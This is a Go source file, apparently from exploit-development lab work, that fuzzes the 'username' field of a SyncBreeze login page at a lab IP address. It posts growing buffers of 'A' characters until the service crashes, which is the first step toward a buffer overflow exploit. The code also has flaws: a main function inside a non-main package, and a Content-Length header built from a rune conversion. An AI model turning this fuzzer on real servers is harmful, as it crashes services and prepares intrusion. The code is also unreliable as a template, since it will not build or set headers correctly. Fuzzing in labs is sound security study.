// SyncBreeze 'username' POST parameter fuzzer
// By disastrpc @ github.com/disastrpc

package fuzz

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const target string = "http://192.168.138.10/login"

func er(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {

	client := http.Client{
		Timeout: 5 * time.Second,
	}

	for S := 100; S < 2000; S += 100 {
		buf := strings.Repeat("A", S)
		fmt.Printf("Injecting buffer of %d bytes\n", S)
		form := url.Values{}
		form.Add("username", buf)
		form.Add("password", "test")

		req, err := http.NewRequest("POST", target, strings.NewReader(form.Encode()))
		er(err)
		req.PostForm = form
		req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
		req.Header.Add("content-Type", "application/x-www-form-urlencoded")
		req.Header.Add("Content-Length", string(len(buf)))
		resp, err := client.Do(req)

		if err != nil {
			fmt.Printf("Crash with buffer of %d bytes\n", len(buf))
			os.Exit(0)
		}
		defer req.Body.Close()

		fmt.Println(resp.Status)
		time.Sleep(time.Second * 1)
	}

}
